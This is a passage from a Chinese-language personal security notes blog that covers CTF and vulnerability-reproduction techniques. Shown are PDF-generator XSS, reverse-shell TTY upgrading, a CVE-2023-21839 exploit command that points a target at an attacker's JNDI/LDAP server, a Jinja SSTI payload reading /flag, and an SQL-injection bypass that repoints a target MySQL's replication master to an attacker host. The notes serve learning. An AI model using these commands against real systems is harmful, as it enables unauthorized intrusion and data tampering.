创建者机器人找到某种 HTML 标记，它将解释它们，您可以滥用此行为<code>导致服务器 XSS</code>。</p></blockquote>\n<p>请注意，<code>&lt;script&gt;&lt;/script&gt;</code> 标签并不总是有效，因此您需要不同的方法来执行 JS（例如，滥用 <code>&lt;img</code>,<code>&lt;iframe&gt;</code>）。 </p>\n<p>另外，请注意，在常规利用中，您将能够<strong>查看&#x2F;下载创建的pdf</strong>，因此您将能够看到<code>通过JS编写的所有内容</code>（例如使用<code>document.write（）</code>）。</p>\n<p>但是，如果您<strong>看不到</strong>创建的PDF，则可能需要<strong>提取信息，从而向您发出Web请求</strong>（盲写，然后看回显猜测）。</p>\n<h1 id=\"获得稳定的shell\"><a href=\"#获得稳定的shell\" class=\"headerlink\" title=\"获得稳定的shell\"></a>获得稳定的shell</h1><p>【不会因为ctrl+c退出，而且可以按上下键，返回之前的命令】</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><ol>\n<li><p><strong>python -c ‘import pty;pty.spawn(“&#x2F;bin&#x2F;bash”)’</strong> 或者</p>\n<p>**python3 -c ‘import pty;pty.spawn(“&#x2F;bin&#x2F;bash”)’**进入交互式shell</p>\n</li>\n<li><p><code>Ctrl-Z</code>将shell放到后台</p>\n</li>\n<li><p><code>stty raw -echo ; fg ; reset</code></p>\n</li>\n</ol>\n<p>&#x2F;&#x2F;stty 设置终端端口设备的接口选项</p>\n<p>&#x2F;&#x2F;echo 表示回显，比如当-echo时，输入ls后按回车，仍然会看到ls</p>\n<p>&#x2F;&#x2F;fg把shell提到前台来</p>\n<p>&#x2F;&#x2F;reset表示重启终端，此时的终端为我们靶机的shell窗口，所以不容易被退出或者中断</p></blockquote>\n<p><img src=\"/post/Note/image-20221002145951718.png\" alt=\"image-20221002145951718\"></p>\n<p>成功获得全交互式<code>shell</code></p>\n<h1 id=\"T3协议的反序列化攻击\"><a href=\"#T3协议的反序列化攻击\" class=\"headerlink\" title=\"T3协议的反序列化攻击\"></a>T3协议的反序列化攻击</h1><p>这是在复现CVE-2023-21839时，查看其利用的基本原理T3&#x2F;时看到的</p>\n<p><a href=\"https://www.cnblogs.com/unicodeSec/p/14378757.html\">学习文章</a></p>\n<h1 id=\"记第一次公网测试\"><a href=\"#记第一次公网测试\" class=\"headerlink\" title=\"记第一次公网测试\"></a>记第一次公网测试</h1><p>比如，在复现cve-2023-21839时</p>\n<pre class=\" language-highlight plaintext\"><code class=\"language-highlight plaintext\">./web.exe -ip 公网ip -port 7001 -ldap ldap://另一个公网ip（挂者jndi）:1389/xx</code></pre>\n\n<p>如果想在本机进行复现，需要让自己的ip变成可以被公网访问的ip，在上面进行打开ldap，以及挂上恶意类，否则只能本地测试</p>\n<h1 id=\"file-b解析-后内容显示\"><a href=\"#file-b解析-后内容显示\" class=\"headerlink\" title=\"file -b解析#!后内容显示\"></a>file -b解析#!后内容显示</h1><p>这里就需要一个知识点<code>#!</code>后的内容，会被视为文件的解释器，然后打印出来，比如</p>\n<p><img src=\"/post/Note/image-20230312224705119.png\" alt=\"image-20230312224705119\"></p>\n<p>这里</p>\n<pre class=\" language-highlight plaintext\"><code class=\"language-highlight plaintext\">a &#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cat /flag&#x27;).read()&#125;&#125; script, ASCII text executable</code></pre>\n\n<p>就看出来它把文本</p>\n<pre class=\" language-highlight plaintext\"><code class=\"language-highlight plaintext\">&#123;&#123;config.__class__.__init__.__globals__[&#x27;os&#x27;].popen(&#x27;cat /flag&#x27;).read()&#125;&#125;</code></pre>\n\n<p>当作了<code>script</code>解析器，在解析文件类型时，就把它打印出来了</p>\n<p>于是我们上传该文件</p>\n<p><img src=\"/post/Note/image-20230312224941575.png\" alt=\"image-20230312224941575\"></p>\n<p>得到flag</p>\n<h1 id=\"strace命令\"><a href=\"#strace命令\" class=\"headerlink\" title=\"strace命令\"></a>strace命令</h1><p>在Linux系统中，strace命令是一个集诊断、调试、统计与一体的工具，可用来追踪调试程序，能够与其他命令搭配使用。</p>\n<p>在Linux世界，<code>进程不能直接访问硬件设备</code>，当进程需要访问硬件设备 (比如读取磁盘文件，接收网络数据等等)时，必须由用户态模式切换至内核态模式，通过系统调用访问硬件设备。<code>strace可以跟踪到一个进程产生的系统调用,包括参数，返回值，执行消耗的时间。</code></p>\n<p>而对于一些命令而言也可以监控其调用的一些文件信息</p>\n<p>比如</p>\n<pre class=\" language-highlight plaintext\"><code class=\"language-highlight plaintext\">strace /bin/file\n#查询file命令执行需要调用的文件信息</code></pre>\n\n<p><img src=\"/post/Note/image-20230330210854308.png\" alt=\"image-20230330210854308\"></p>\n<p>可以看到调用了一个<code>/etc/ld.so.preload</code>文件</p>\n<p><img src=\"/post/Note/image-20230330211853378.png\" alt=\"image-20230330211853378\"></p>\n<h1 id=\"Mysql主从复制\"><a href=\"#Mysql主从复制\" class=\"headerlink\" title=\"Mysql主从复制\"></a>Mysql主从复制</h1><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>主从复制的基础是主服务器对数据库修改记录二进制日志，从服务器通过主服务器的二进制日志自动执行更新，也就是主库只传日志给从库，从库根据日志执行命</p>\n<p>[学习文章]</p>\n<p>作者：小熊我不要了<br>链接：<a href=\"https://juejin.cn/post/6844903921677238285\">https://juejin.cn/post/6844903921677238285</a></p></blockquote>\n<p>在某比赛遇到的，一个<code>sql</code>注入环境，对语句过滤很多，也包括<code>select、updatexml</code>等等常用的语句。</p>\n<p>但是没有过滤<code>show，slave，change</code>等语句</p>\n<hr>\n<p>该题需要一个登录，是在一个php语句中</p>\n<p>大概是从ctf库中，查询其中的admin表，匹配其中用户名和密码</p>\n<p>但是ctf库，利用<code>show tables in ctf;</code>发现是一个空库，连表也没有，也就是直接登录改根本不行，需要修改它的数据库，添加用户信息</p>\n<p><code>show variables like &#39;secure_file_priv&#39;;</code>查看其有没有可以被读取或写入的文件，也是空</p>\n<hr>\n<p>所以根据主从复制的思路就是，攻击机搭建一个数据库作为主库，而环境的数据库当作从库，从而实现在攻击上进行修改使得从库【环境数据库】被修改</p>\n<p>为什么会想到利用主从复制，其实很简单，过滤了这么多，但是执行</p>\n<pre class=\" language-highlight plaintext\"><code class=\"language-highlight plaintext\">show slave status;</code></pre>\n\n<p>可以看到回显，并且显示Running</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p><strong>主从配置</strong></p>\n<p>在主从配置之前需要确保两台mysql需要同步的库状态一致。</p></blockquote>\n<h2 id=\"攻击机【主】\"><a href=\"#攻击机【主】\" class=\"headerlink\" title=\"攻击机【主】\"></a>攻击机【主】</h2><p>配置文件默认在<code>/etc/my.cnf</code>下。</p>\n<p>在配置文件中新增配置：</p>\n<pre class=\" language-highlight ini\"><span class=\"section\"><code class=\"language-highlight ini\"><span class=\"section\">[mysqld]</span>\n<span class=\"comment\">## 同一局域网内注意要唯一</span>\n<span class=\"attr\">server-id</span>=<span class=\"number\">100</span>  \n<span class=\"comment\">## 开启二进制日志功能，可以随便取（关键）</span>\n<span class=\"attr\">log-bin</span>=mysql-bin</code></pre>\n\n<p>修改配置后需要重启才能生效：</p>\n<pre class=\" language-highlight plaintext\"><code class=\"language-highlight plaintext\">service mysql restart</code></pre>\n\n<p>重启之后进入mysql：</p>\n<pre class=\" language-highlight plaintext\"><code class=\"language-highlight plaintext\">mysql -uroot -p</code></pre>\n\n<p>在<code>master</code>数据库创建数据同步用户，授予用户 slave REPLICATION SLAVE权限和REPLICATION CLIENT权限，用于在主从库之间同步数据。</p>\n<pre class=\" language-highlight plaintext\"><code class=\"language-highlight plaintext\">CREATE USER &#x27;slave&#x27;@&#x27;%&#x27; IDENTIFIED BY &#x27;@#$Rfg345634523rft4fa&#x27;;\nGRANT REPLICATION SLAVE, REPLICATION CLIENT ON *.* TO &#x27;slave&#x27;@&#x27;%&#x27;;</code></pre>\n\n<p>语句中的<code>%</code>代表所有服务器都可以使用这个用户，如果想指定特定的ip，将<code>%</code>改成ip即可。</p>\n<p>查看主mysql的状态：</p>\n<pre class=\" language-highlight plaintext\"><code class=\"language-highlight plaintext\">show master status;</code></pre>\n\n<p>记录下<code>File</code>和<code>Position</code>的值，并且不进行其他操作以免引起<code>Position</code>的变化。</p>\n<p><img src=\"/post/Note/image-20230330224610135.png\" alt=\"image-20230330224610135\"></p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p><code>File</code>：这是 MySQL 服务器正在写入的当前二进制日志文件的名称。</p>\n<p><code>Position</code>：这是下一个事件将被写入的二进制日志文件中的位置。</p></blockquote>\n<h3 id=\"环境执行【从】\"><a href=\"#环境执行【从】\" class=\"headerlink\" title=\"环境执行【从】\"></a>环境执行【从】</h3><p>配置环境已经有了，所以不用考虑如何修改</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>在从<code>my.cnf</code>配置中新增：</p>\n<pre class=\" language-highlight ini\"><code class=\"language-highlight ini\">mysqld]\n<span class=\"comment\">## 设置server_id,注意要唯一</span>\n<span class=\"attr\">server-id</span>=<span class=\"number\">101</span>  \n<span class=\"comment\">## 开启二进制日志功能，以备Slave作为其它Slave的Master时使用</span>\n<span class=\"attr\">log-bin</span>=mysql-slave-bin   \n<span class=\"comment\">## relay_log配置中继日志</span>\n<span class=\"attr\">relay_log</span>=edu-mysql-relay-bin</code></pre>\n\n<p>修改配置后需要重启才能生效：</p></blockquote>\n<p>修改主库信息，将主库信息改成攻击机，用户名和密码都是主机之前建立的</p>\n<pre class=\" language-highlight plaintext\"><code class=\"language-highlight plaintext\">change master to master_host=&#x27;攻击机ip&#x27;, master_user=&#x27;slave&#x27;, master_password=&#x27;@#$Rfg345634523rft4fa&#x27;, master_port=3306, master_log_file=&#x27;mysql-bin.000064&#x27;, master_log_pos= 12, master_connect_retry=30;</code></pre>\n\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>*注：日志的postion和file要修改成自己的攻击机对应的，指定从库从哪个文件进行读取，从哪个位置进行读取</p></blockquote>\n<p>修改后，执行</p>\n<pre class=\" language-highlight plaintext\"><code class=\"language-highlight plaintext\">start slave;\n#开启主从复制</code></pre>\n\n<p>然后执行</p>\n<pre class=\" language-highlight plaintext\"><code class=\"language-highlight plaintext\">show slave status;\n#查看同步状态</code></pre>\n\n<p>得到<code>SlaveIORunning</code> 和 <code>SlaveSQLRunning</code> 都是Yes说明主从复制已经开启</p>\n<p>然后就按之前得到信息，在主库建立ctf库，然后建立admin表，在里面添加user和password的数据、</p>\n<p>最后等环境数据库【从库】与攻击机数据库同步后，即可进行成功登录拿到flag</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>P.S</p>\n<p>由于mysql8新增密码规则<code>caching_sha2_password</code>，要求密码必须有一定复杂度，必须有字母大小写、数字和特殊符号，所以可能有时密码通不过，可以尝试修改密码规则为<code>mysql_native_password</code>以实现可以用简易密码</p></blockquote>\n<h1 id=\"windows与linux对-的不同解析与限制\"><a href=\"#windows与linux对-的不同解析与限制\" class=\"headerlink\" title=\"windows与linux对;的不同解析与限制\"></a>windows与linux对;的不同解析与限制</h1><p>在windows中，你可以将文件名名为类似</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>1;hahahaha;.txt</p></blockquote>\n<p><img src=\"/post/Note/image-20230501222412594.png\" alt=\"image-20230501222412594\"></p>\n<p>而在linux中则不行，因为它会将其解析成三段命令</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 